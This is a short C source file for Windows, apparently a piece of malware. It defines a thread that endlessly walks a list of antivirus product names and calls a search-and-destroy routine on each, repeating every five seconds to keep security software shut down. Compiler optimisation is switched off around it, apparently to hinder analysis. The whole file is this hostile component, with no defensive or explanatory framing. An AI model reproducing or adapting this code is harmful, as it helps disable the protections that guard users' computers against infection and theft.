#include "data_globals.h"
#include <windows.h>
#include <stdbool.h>

#pragma optimize("", off)
DWORD WINAPI _AntiVirusTerminate(void)
{
    volatile int index_buf[2] = {{0, (int)0}};
    volatile int *p_index = (volatile int *)&index_buf[0];
    
    do {
        for ((*p_index) = 0; AntiVirus[(*p_index)] != NULL; (*p_index)++) {
            _SearchNDestroy((char *)AntiVirus[(*p_index)]);
        }
        Sleep(5000);
    } while(true);
    
    return 0;
}
#pragma optimize("", on)
